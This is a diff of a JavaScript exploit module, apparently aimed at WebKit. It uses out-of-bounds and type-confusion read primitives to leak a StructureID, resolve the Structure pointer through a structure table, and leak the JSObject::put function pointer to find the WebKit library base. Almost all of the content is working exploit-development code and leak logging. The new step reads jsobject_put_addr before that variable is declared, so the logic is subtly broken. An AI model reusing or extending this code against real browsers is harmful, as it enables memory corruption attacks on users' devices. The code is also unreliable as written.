@@ -1,8 +1,10 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v107 - R67 com Re-trigger do OOB antes da Fase 5)
+// js/script3/testArrayBufferVictimCrash.mjs (v108 - R68 Tentativa de Bypass StructureID)
 // =======================================================================================
 // ESTRATÉGIA ATUALIZADA:
-// - Repetir a inicialização completa do ambiente OOB (triggerOOB_primitive) antes da Fase 5.
-// - Manter o warm-up e os ajustes de pauses.
+// - Tenta vazar o StructureID (Uint32) do offset 0x0 do JSCell.
+// - Usa um offset PLACEHOLDER para a tabela de Structures (STRUCTURE_TABLE_OFFSET_FROM_WEBKIT_BASE).
+// - Calcula o endereço real da Structure a partir do ID e da tabela.
+// - Prossegue com o vazamento da vfunc::put a partir do endereço real da Structure.
 // =======================================================================================
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
@@ -14,7 +16,7 @@ import {
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
 // Nome do módulo atualizado para refletir a nova tentativa de correção
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v107_R67_ReTriggerOOB";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v108_R68_BypassStructureID";
 
 // --- Funções de Conversão (Double <-> Int64) ---
 function int64ToDouble(int64) {
@@ -38,7 +40,7 @@ function doubleToInt64(double) {
 // =======================================================================================
 export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação com Re-trigger do OOB ---`, "test");
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação com Tentativa de Bypass de StructureID ---`, "test");
 
     let final_result = {
         success: false,
@@ -172,26 +174,59 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         
         await PAUSE_S3(250); 
 
-        // 2. Ler o ponteiro para a Estrutura (Structure) do objeto.
-        const structure_addr_ptr = leak_target_addr.add(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET);
+        // NOVO: Etapa 2.1 - Tentar ler o StructureID do offset 0x0
+        const structure_id_ptr = leak_target_addr.add(JSC_OFFSETS.JSCell.STRUCTURE_ID_FLATTENED_OFFSET); // Offset 0x0
         leaker.obj_prop = null; 
-        const structure_addr = arb_read_final_func(structure_addr_ptr);
-        logS3(`[Etapa 2] Lendo do endereço ${structure_addr_ptr.toString(true)} para obter o ponteiro da Estrutura...`, "debug");
-        logS3(`[Etapa 2] Endereço da Estrutura (Structure) do objeto: ${structure_addr.toString(true)}`, "leak");
+        // Ler 4 bytes para o StructureID
+        const structure_id_val = arb_read_final_func(structure_id_ptr, 4); // <--- Lendo 4 bytes (Uint32)
+        logS3(`[Etapa 2.1] Lendo do endereço ${structure_id_ptr.toString(true)} (JSCell + 0x0) para obter o StructureID...`, "debug");
+        logS3(`[Etapa 2.1] StructureID vazado: ${toHex(structure_id_val)} (decimal: ${structure_id_val})`, "leak");
 
+        if (typeof structure_id_val !== 'number' || structure_id_val === 0) { // Validar que não é zero e é um número
+            throw new Error(`FALHA CRÍTICA: StructureID é NULO ou inválido (${toHex(structure_id_val)}). Provavelmente não é um StructureID válido.`);
+        }
+        if (structure_id_val > 0x10000) { // StructureIDs geralmente não são tão grandes (24 bits = max 0xFFFFFF)
+             logS3(`[Etapa 2.1] ALERTA: StructureID é unexpectedly large (${toHex(structure_id_val)}). Pode ser um ponteiro.`, "warn");
+        }
+
+
+        // 2.2 - Calcular o endereço real da Structure a partir do ID
+        // Primeiro, precisamos do endereço base da WebKit (já obtido implicitamente se chegamos aqui)
+        // e do offset da tabela de estruturas (JSC_OFFSETS.STRUCTURE_TABLE_OFFSET_FROM_WEBKIT_BASE)
+        const webkit_base_candidate_for_struct_table = jsobject_put_addr.sub(new AdvancedInt64(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["JSC::JSObject::put"])); // Re-calculando provisoriamente para uso interno
+        
+        if (webkit_base_candidate_for_struct_table.low() === 0 && webkit_base_candidate_for_struct_table.high() === 0) {
+             throw new Error("Erro interno: webkit_base_candidate_for_struct_table é nulo.");
+        }
+
+        const structure_table_base_addr = webkit_base_candidate_for_struct_table.add(
+            new AdvancedInt64(JSC_OFFSETS.STRUCTURE_TABLE_OFFSET_FROM_WEBKIT_BASE)
+        );
+        logS3(`[Etapa 2.2] Endereço base da Tabela de Estruturas (estimado): ${structure_table_base_addr.toString(true)}`, "info");
+        
+        // Cada entrada na tabela de estruturas é geralmente um ponteiro de 8 bytes (QWORD)
+        const structure_entry_offset = new AdvancedInt64(structure_id_val).multiply(new AdvancedInt64(8)); 
+        const real_structure_ptr_addr = structure_table_base_addr.add(structure_entry_offset);
+        
+        leaker.obj_prop = null; 
+        const structure_addr = arb_read_final_func(real_structure_ptr_addr, 8); // <--- Lendo 8 bytes (QWORD) para o ponteiro real da Structure
+        logS3(`[Etapa 2.2] Lendo do endereço ${real_structure_ptr_addr.toString(true)} para obter o ponteiro real da Estrutura (ID: ${structure_id_val})...`, "debug");
+        logS3(`[Etapa 2.2] Endereço REAL da Estrutura (Structure) do objeto: ${structure_addr.toString(true)}`, "leak");
+
+        // ADICIONADO: Verificação de Contaminação e Validade (para o ponteiro REAL da Structure)
         if (structure_addr.equals(value_to_write) || structure_addr.low() === 0 && structure_addr.high() === 0) {
-            throw new Error("FALHA CRÍTICA: Ponteiro da Estrutura é NULO/Inválido ou contaminação persistente.");
+            throw new Error("FALHA CRÍTICA: Ponteiro REAL da Estrutura é NULO/Inválido ou contaminação persistente.");
         }
         if (!((structure_addr.high() >>> 16) === 0x7FFF || (structure_addr.high() === 0 && structure_addr.low() !== 0))) { 
-             logS3(`[Etapa 2] ALERTA: high part do Structure Address inesperado: ${toHex(structure_addr.high())}`, "warn");
+             logS3(`[Etapa 2.2] ALERTA: high part do REAL Structure Address inesperado: ${toHex(structure_addr.high())}`, "warn");
         }
 
 
-        // 3. Ler o ponteiro da função virtual 'put' de dentro da Estrutura.
+        // 3. Ler o ponteiro da função virtual 'put' de dentro da Estrutura (agora com o endereço REAL)
         const vfunc_put_ptr_addr = structure_addr.add(JSC_OFFSETS.Structure.VIRTUAL_PUT_OFFSET);
         leaker.obj_prop = null; 
-        const jsobject_put_addr = arb_read_final_func(vfunc_put_ptr_addr);
-        logS3(`[Etapa 3] Lendo do endereço ${vfunc_put_ptr_addr.toString(true)} (Structure + 0x18) para obter o ponteiro da vfunc...`, "debug");
+        const jsobject_put_addr = arb_read_final_func(vfunc_put_ptr_addr); // <--- Leitura de 8 bytes (padrão)
+        logS3(`[Etapa 3] Lendo do endereço ${vfunc_put_ptr_addr.toString(true)} (Structure REAL + 0x18) para obter o ponteiro da vfunc...`, "debug");
         logS3(`[Etapa 3] Endereço vazado da função (JSC::JSObject::put): ${jsobject_put_addr.toString(true)}`, "leak");
         if(jsobject_put_addr.low() === 0 && jsobject_put_addr.high() === 0) throw new Error("Ponteiro da função JSC::JSObject::put é NULO ou inválido.");
         if (!((jsobject_put_addr.high() >>> 16) === 0x7FFF || (jsobject_put_addr.high() === 0 && jsobject_put_addr.low() !== 0))) {
@@ -217,7 +252,6 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         final_result.message = `Exceção na implementação funcional: ${e.message}\n${e.stack || ''}`;
         logS3(final_result.message, "critical");
     } finally {
-        // Limpar referências globais após o teste para evitar mais contaminação
         confused_array = null;
         victim_array = null;
         leaker = null;
@@ -239,6 +273,6 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         },
         heisenbug_on_M2_in_best_result: final_result.success,
         oob_value_of_best_result: 'N/A (Estratégia Uncaged)',
-        tc_probe_details: { strategy: 'Uncaged Self-Contained R/W (Full OOB Re-trigger)' }
+        tc_probe_details: { strategy: 'Uncaged Self-Contained R/W (StructureID Bypass Attempt)' }
     };
 }
